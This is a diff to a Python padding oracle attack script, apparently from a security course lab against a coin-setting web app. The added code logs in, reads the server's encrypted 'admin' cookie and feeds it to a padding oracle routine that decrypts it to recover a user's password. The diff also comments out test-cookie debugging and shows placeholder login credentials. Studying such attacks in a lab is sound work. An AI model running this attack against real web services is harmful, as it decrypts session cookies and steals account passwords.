@@ -122,6 +122,8 @@ def po_attack(po, ctx):
          # plaintext = plain + plaintext
          plaintext += plain
          print("Concat plaintext: {}".format(plaintext))
+
+    return plaintext
          
 def is_response_ok(response):
     """
@@ -146,50 +148,45 @@ def check_padding_response(cookie):
 
     return is_response_ok(response)
 
+def do_attack(admin_cookie_hex):
+    """
+    Given a hex encoded admin cookie, run padding oracle attack and return the password
+    """
+
+    po = PaddingOracle(SETCOINS_FORM_URL)
+    password = po_attack(po, bytearray.fromhex(admin_cookie_hex))
+
+    return password
+
 if __name__ == "__main__":
     print("Running Padding Oracle Attack")
     
+    # Create session and login to webserver
     sess = Session()
-    print("Cookie pre logon: {}".format(sess.cookies.get_dict()))
+    # Change username and password to whatever you want
     uname ="victim"
     pw = "victim"
-    # uname = "andrew"
-    # pw = "hellomynameisandrewpalmeriliketosurf"
-    uname = 'test'
-    pw = 'thisisalongpasswordtotest'
+    # uname = 'test'
+    # pw = 'thisisalongpasswordtotest'
     assert(do_login_form(sess, uname,pw))
+
     print("Cookies after logon: {}".format(sess.cookies.get_dict()))
     admin_cookie = sess.cookies.get_dict()["admin"]
     print("Admin cookie: {}".format(admin_cookie))
     admin_cookie_bytes = bytearray.fromhex(admin_cookie)
     print("Admin cookie bytes: {}".format(admin_cookie_bytes))
 
-    # First byte (C0 == IV)
-    C0 = admin_cookie_bytes[0]
-    print("CO: {}".format(C0))
-
-    # Check padding response success
-    # success = check_padding_response(bytes(16))
-    # print("Success? {}".format(success))
-
-    TEST_COOKIE = bytearray.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
-    print("Test cookie (len {}): {}".format(len(TEST_COOKIE), TEST_COOKIE))
-
-    print("test cookie first 32 bytes: {}".format(TEST_COOKIE[:32]))
-    first_two_blocks = TEST_COOKIE[:32]
+    # TEST_COOKIE = bytearray.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
+    # print("Test cookie (len {}): {}".format(len(TEST_COOKIE), TEST_COOKIE))
 
     # Instantitate padding oracle
     po = PaddingOracle(SETCOINS_FORM_URL)
-    result = po_attack_2blocks(po, first_two_blocks)
-    print("PO Attack 2 blocks result: {}".format(result))
 
-    # Test with full test cookie
-    # full_result = po_attack(po, TEST_COOKIE)
+    # Do padding oracle attack on admin cookie to get the password
+    p = do_attack(admin_cookie)
+    print("Do Attack result: {}".format(p))
 
-    # TODO: Capture user's password from admin cookie
-    password = po_attack(po, admin_cookie_bytes)
-
-    # TODO: Manually decrypt password to test po attack
+    # Manually decrypt password to test po attack
     # encryption_key = b'\x00'*16
     # cbc = app.api.encr_decr.Encryption(encryption_key)
     # dpt = cbc.decrypt(bytes.fromhex(admin_cookie))
